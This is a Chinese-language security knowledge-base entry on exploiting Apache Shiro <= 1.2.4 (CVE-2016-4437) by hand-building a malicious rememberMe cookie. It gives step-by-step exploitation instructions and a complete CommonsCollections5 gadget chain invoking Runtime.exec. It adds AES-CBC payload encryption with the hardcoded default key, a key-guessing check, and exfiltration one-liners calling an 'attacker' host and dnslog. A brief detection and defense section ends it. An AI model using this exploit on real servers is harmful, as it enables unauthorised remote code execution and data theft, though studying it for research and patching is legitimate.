---
id: web-java-framework-shiro-550-manual-rememberme-payload
title: 手工构造 Shiro-550 rememberMe 载荷：AES-CBC 加密与密钥判定
type: scenario
domain: web
path: web/java/framework/shiro
technique: shiro-550-manual-rememberme-payload
tags:
- java
- shiro
- deserialization
- rememberme
- aes
- cc5
- payload
cve:
- CVE-2016-4437
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Apache Shiro <= 1.2.4
verification:
  verified_by: verifier-V11
  verified_at: '2026-11-05T01:49:06+08:00'
  notes: 已修复 Base64 表述与 PoC 代码并复核：PoC 现为 Base64.getEncoder().encodeToString(encrypted) 单行，保留标准 +/ 与 = padding，已删除 -/_ 替换；结论与步骤5文字一致。AES-128-CBC/PKCS5、16字节IV||密文、默认密钥 kPH+bIxk5D2deZiIxcaaaA==、CookieRememberMeManager→convertBytesToPrincipals→DefaultSerializer.readObject、CC5 构造均与原文图2-20一致；影响版本 Shiro<=1.2.4 已设置。复核通过。
url: /docs/web/java/framework/shiro/web-java-framework-shiro-550-manual-rememberme-payload/
draft: false
kb_aliases:
- Shiro 手工 POC
- rememberMe AES-CBC
- IV 拼接载荷
- 密钥爆破判定 AC ED
- Shiro CC5
---

## 一句话结论

Shiro <= 1.2.4 的 `rememberMe` Cookie 是 `Base64(16字节IV + AES-128-CBC(PKCS5(Java序列化数据)))`，密钥为常量 `kPH+bIxk5D2deZiIxcaaaA==`；按该格式手工加密 CC5 链，使用标准 Base64（保留 `+`/`/`，不要替换成 `-`/`_`；按 Shiro 的 Base64 实现补齐 `=` padding），即可构造可执行的 rememberMe。

## 原理

- `AbstractRememberMeManager.encrypt()` 每次生成 16 字节随机 IV，用 `AesCipherService`（AES-128-CBC + PKCS5Padding）加密序列化字节，再把 `IV || ciphertext` 拼接。
- `CookieRememberMeManager` 把拼接结果 Base64 后写入 `rememberMe` Cookie；读取时 Base64 解码、取前 16 字节为 IV、其余为密文、AES 解密，最后交给 `DefaultSerializer.deserialize()`，内部直接 `new ObjectInputStream(bytes).readObject()`。
- 密钥来自 `AbstractRememberMeManager` 构造器里的 `setCipherKey(DEFAULT_CIPHER_KEY_BYTES)`，该常量是 `Base64.decode("kPH+bIxk5D2deZiIxcaaaA==")`；1.2.4 之后改为要求开发者配置，未配置则随机生成。
- 因为密钥固定且公开，攻击者可以自己完成加密；反序列化时 `readObject()` 递归实例化对象并调用其 `readObject`，触发 CommonsCollections 等 gadget 链。
- 本文以 CC5 为例：`ConstantTransformer(Runtime.class)` → `InvokerTransformer("getMethod", ...)` → `InvokerTransformer("invoke", ...)` → `InvokerTransformer("exec", ...)`，用 `ChainedTransformer` 串联，`LazyMap` 包装，`TiedMapEntry` 作为入口，最后把 entry 反射塞进 `BadAttributeValueExpException.val`，使反序列化时通过 `toString()` 触发。
- 密钥是否有效可用「解密后是否以 Java 序列化魔数 `AC ED 00 05` 开头」判定；对返回的 `rememberMe=deleteMe` 或任意 Cookie 尝试字典密钥即可。

## 触发条件

- Apache Shiro <= 1.2.4，或更高版本仍使用默认/弱密钥。
- 应用启用 rememberMe（登录页有“记住我”，或请求/响应出现 `rememberMe` Cookie）。
- classpath 存在可用 gadget（CommonsCollections 3.x 等），且 JDK 版本允许对应链。
- 攻击者可访问任意使用 Shiro 过滤器的 URL（不要求已登录）。

## 利用步骤

1. 识别 Shiro：请求任意路径，观察响应是否出现 `rememberMe=deleteMe`；登录勾选记住我后抓取 `rememberMe` Cookie。
2. 用字典密钥逐个尝试：Base64 解码 Cookie、取 IV、AES-CBC 解密，检查明文是否以 `AC ED 00 05` 开头。
3. 选定可用 gadget 链（本文 CC5），生成序列化字节。
4. 生成 16 字节随机 IV，AES-128-CBC/PKCS5 加密序列化字节，拼接 `IV || ciphertext`。
5. 用标准 Base64（`+`/`/`）编码，按 Shiro Base64 实现补齐 `=` padding，不要做 URL-safe 字母表替换；放入 `rememberMe` Cookie 发送。
6. 观察命令执行；无回显时用 DNS/HTTP 外带。

## PoC

CC5 链构造（原文手工版本）：

```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec", new Class[]{String.class},
        new Object[]{"calc.exe"})
};
Transformer chained = new ChainedTransformer(transformers);
Map lazyMap = LazyMap.decorate(new HashMap(), chained);
TiedMapEntry entry = new TiedMapEntry(lazyMap, "dummy_key");
BadAttributeValueExpException exploit = new BadAttributeValueExpException(null);
Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
valField.setAccessible(true);
valField.set(exploit, entry);
```

加密与 Cookie 生成（结构示意）：

```java
byte[] key = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
byte[] payload = serialize(exploit);
byte[] iv = new byte[16];
new SecureRandom().nextBytes(iv);
Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
byte[] ciphertext = cipher.doFinal(payload);
byte[] encrypted = ByteBuffer.allocate(iv.length + ciphertext.length)
    .put(iv).put(ciphertext).array();
String cookie = Base64.getEncoder().encodeToString(encrypted); // 标准 Base64，保留 + / 与 = padding
```

密钥判定：

```python
# 伪代码：decrypt(cookie, key) 后检查明文
plain = aes_cbc_decrypt(base64_decode(cookie), key)
assert plain.startswith(b"\xac\xed\x00\x05")
```

## 变体与关联

- 载荷链变体：CommonsBeanutils1、CC6、JNDI 等；不同链对依赖/JDK 要求不同。
- 无回显变体：`ping <token>.dnslog.cn`、`curl http://attacker/?x=$(whoami|base64)`、URLDNS 探测。
- 内存马变体：在链尾注入 Filter/Servlet 内存马，避免落地文件。
- 关联：[[web-java-framework-shiro-550-hardcoded-key-deserialization]]（同一漏洞的概览与工具利用）；[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（CC 链细节）。
- 边界：Shiro >= 1.2.5 默认随机密钥；强随机密钥且不在字典、或 classpath 无可用 gadget、或 JDK 封禁对应链时失败。

## 检测与防御

- 检测：异常长的 `rememberMe` Cookie；响应反复 `rememberMe=deleteMe`；反序列化异常栈出现 gadget 类名；服务端异常子进程/DNS 外连。
- 防御：升级 Shiro 并配置强随机密钥；关闭不必要的 rememberMe；使用 `ObjectInputFilter` 类白名单；移除多余 gadget 依赖；限制出站；对 Cookie 解密失败与反序列化异常告警。
